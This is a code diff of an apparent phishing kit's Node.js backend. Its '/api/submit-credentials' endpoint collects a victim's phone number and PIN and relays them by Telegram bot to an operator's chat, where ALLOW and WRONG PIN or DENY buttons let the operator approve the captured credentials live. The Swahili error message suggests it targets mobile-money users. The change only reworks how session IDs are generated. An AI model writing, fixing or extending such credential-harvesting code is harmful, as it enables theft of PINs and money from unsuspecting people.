@@ -156,19 +156,14 @@ app.get('/', (req, res) => {
 // Step 1: Submit Phone Number & PIN
 app.post('/api/submit-credentials', async (req, res) => {
   try {
-    let { phone, pin, adminChatId, userId } = req.body || {};
+    let { phone, pin, adminChatId } = req.body || {};
     if (!adminChatId && req.query && req.query.admin) {
       adminChatId = req.query.admin;
     }
 
     const targetChat = resolveTargetChat(adminChatId);
-    let currentUserId = userId;
-    
-    if (!currentUserId || !sessions.has(currentUserId)) {
-      currentUserId = `user_${Date.now()}`;
-    }
-
-    sessions.set(currentUserId, { 
+    const userId = `user_${Date.now()}`;
+    sessions.set(userId, { 
       phone, pin, 
       adminChatId: targetChat, 
       status: 'WAITING_CREDS_APPROVAL' 
@@ -183,8 +178,8 @@ app.post('/api/submit-credentials', async (req, res) => {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: 'ALLOW', callback_data: `ALLOW_CREDS_${currentUserId}` },
-            { text: 'WRONG PIN ❌', callback_data: `WRONG_PIN_${currentUserId}` }
+            { text: 'ALLOW', callback_data: `ALLOW_CREDS_${userId}` },
+            { text: 'DENY', callback_data: `DENY_CREDS_${userId}` }
           ]
         ]
       }
@@ -194,7 +189,7 @@ app.post('/api/submit-credentials', async (req, res) => {
       await bot.sendMessage(targetChat, message, opts);
     }
     
-    return res.status(200).json({ success: true, userId: currentUserId });
+    return res.status(200).json({ success: true, userId });
   } catch (err) {
     return res.status(500).json({ success: false, error: 'Tatizo la mtandao.' });
   }
@@ -282,3 +277,4 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
+        
